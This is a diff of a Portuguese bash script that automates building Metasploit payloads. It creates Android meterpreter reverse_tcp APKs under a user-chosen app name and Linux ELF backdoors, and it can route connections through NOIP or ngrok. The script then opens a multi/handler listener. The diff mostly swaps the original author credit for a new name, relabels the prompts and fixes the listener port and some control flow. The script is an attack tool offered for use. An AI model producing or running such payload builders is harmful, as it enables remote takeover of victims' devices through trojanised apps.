@@ -1,7 +1,7 @@
 #!/bin/bash
 # ------------------------------------------------------------------------
 # ESTA FERRAMENTA ELA PERMITE GERAR UM PAYLOAD AUTOMATIZADO              *
-#                    CREATE BY : killercrown                                   *
+#                    CREATE BY : GHOST SAD                                   *
 #-------------------------------------------------------------------------
 # CORES
 CYAN="\033[01;36m"
@@ -47,7 +47,7 @@ echo "    CONTATO FACEBOOK:https://bit.ly/2MeUmqJ "
 sleep 0.1
 echo "               V2.0                                        "
 sleep 0.1
-echo "               CREATOR: PAULO HENRIQUE                                           "
+echo "               CREATOR: GHOST SAD                                           "
 sleep 0.1
 echo "____________________________________________________________________________________________"
 sleep 0.1
@@ -95,7 +95,7 @@ echo "  |REDE INTERNA       | WINDOWS     |0.1|         |[4]"
 echo "  |REDE INTERNA       | LINUX       |0.1|         |[5]    "
 echo "  |  EXIT             |  ()         |0.0|         |[6]"
 echo "  -------------------------------------------------    "
-echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
+echo -e " ┌─["${RED}"SAD]──[${RED}~]─["$CYAN"menu]:"
       echo -ne  " └─────► "
       read rap
 if [ $rap -eq "6" ] 
@@ -113,8 +113,8 @@ fi
 ########CRIANDO PAYLOAD EM REDE INTERNA######
 if [ "$rap" -eq "1" ]
 then
-cd arquivos
-clear
+	cd arquivos
+	clear
                                 echo "        _________                                          "
                                 sleep 0.1
                                 echo -e "${CLARO}        |o     o |                             "  
@@ -147,21 +147,20 @@ clear
                                 echo -e " |    | |   \| |____/  | \   |____|   |   |__/          \n "
 
 echo -e "                               ${CLARO}seu ip interno:$lanip                \n${CYAN}"
-echo -e "                               ${CLARO}seu ip externo:"curl ifconfig.me
 PAYLOAD='android/meterpreter/reverse_tcp'
 echo "DIGITE SEU IP INTERNO      "
-echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
+echo -e " ┌─["${RED}"SAD]──[${RED}~]─["$CYAN"menu]:"
       echo -ne  " └─────► "
      read lhost
 
 
 echo -e "[*]Digite a porta aberta[*]\n"
-echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
+echo -e " ┌─["${RED}"SAD]──[${RED}~]─["$CYAN"menu]:"
       echo -ne  " └─────► "
       read lport
 
 echo -e "[*]Digite o nome do aplicativo[*]\n"
-echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
+echo -e " ┌─["${RED}"SAD]──[${RED}~]─["$CYAN"menu]:"
       echo -ne  " └─────► "
       read apk
 
@@ -183,22 +182,22 @@ echo "INSTALAR O NOIP E TENTE NOVAMENTE"
 exit 0
 fi
 echo "DIGITE SEU DOMINIO DO NOIP     "
-echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
+echo -e " ┌─["${RED}"SAD]──[${RED}~]─["$CYAN"menu]:"
       echo -ne  " └─────► "
      read lhost
 
 echo "DIGITE A PORTA ABERTA"
-echo -e "┌─["${RED}"KILLER]──[${RED}~]─["${CYAN}"menu]:"
+echo -e "┌─["${RED}"SAD]──[${RED}~]─["${CYAN}"menu]:"
       echo -ne " └─────► "
 	read lport
 
 echo -e "DIGITE O NOME DO APLICATIVO\n"
-echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
+echo -e " ┌─["${RED}"SAD]──[${RED}~]─["$CYAN"menu]:"
       echo -ne  " └─────► "
       read apk
 
 echo -e "${CLARO}CRIANDO PAYLOAD..." ; msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost  LPORT=$lport R > $apk.apk 2>/dev/null
-clear
+
 
 elif [ $rap -eq "3" ]
 then
@@ -213,17 +212,17 @@ echo -e "${RED}[x]NGROK NAO ENCONTRADO\n[x]"
 exit 0
 fi
 echo "DIGITE O IP DO LOOPBACK "
-echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
+echo -e " ┌─["${RED}"SAD]──[${RED}~]─["$CYAN"menu]:"
       echo -ne  " └─────► "
      read lhost
 
 echo "DIGITE A PORTA QUE O NGROK GEROU"
-echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
+echo -e " ┌─["${RED}"SAD]──[${RED}~]─["$CYAN"menu]:"
       echo -ne  " └─────► "
      read lport
 
 echo "DIGITE O NOME DO APLICATIVO"
-echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
+echo -e " ┌─["${RED}"SAD]──[${RED}~]─["$CYAN"menu]:"
       echo -ne  " └─────► "
      read apk
 
@@ -234,7 +233,7 @@ echo "[+]OBRIGADO POR USAR ESTA FERRAMENTA [+] "
 echo "            PAYLOADS SALVO EM ARQUIVOS"
 echo "           ABRINDO O METASPLOIT...  "
 echo "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
-msfconsole -q -x "use multi/handler ; set PAYLOAD $PAYLOAD ; set LHOST $lhost ; set LPORT 4444 ; exploit" 
+msfconsole -q -x "use multi/handler ; set PAYLOAD $PAYLOAD ; set LHOST $lhost ; set LPORT $lport ; exploit" 
 exit 0
 
 
@@ -247,12 +246,12 @@ cd arquivos
 PAYLOAD='linux/x64/meterpreter/reverse_tcp'
 
 echo "DIGITE O IP INTERNO "
-echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
+echo -e " ┌─["${RED}"SAD]──[${RED}~]─["$CYAN"menu]:"
       echo -ne  " └─────► "
      read lhost
 
 echo "DIGITE A PORTA "
-echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
+echo -e " ┌─["${RED}"SAD]──[${RED}~]─["$CYAN"menu]:"
       echo -ne  " └─────► "
      read lport
 
@@ -261,7 +260,7 @@ echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
 
 echo "CRIANDO PAYLOAD, AGUARDE.." ; msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf  > bin  2>/dev/null
 
-
+fi
 echo "ARQUIVO CRIADO COM SUCESSO. DESEJA CONFIGURAR O HANDLER OU IR SAIR? n\y" && read hand
 clear
 if [ $hand == "y" ]
@@ -283,7 +282,6 @@ echo "APACHE2 DESLIGADO"
 
 echo "OBRIGADO POR USAR ESTA FERRAMENTA"
 exit 0
-fi
 if [ $rap -eq "6" ]
 then
 exit 0
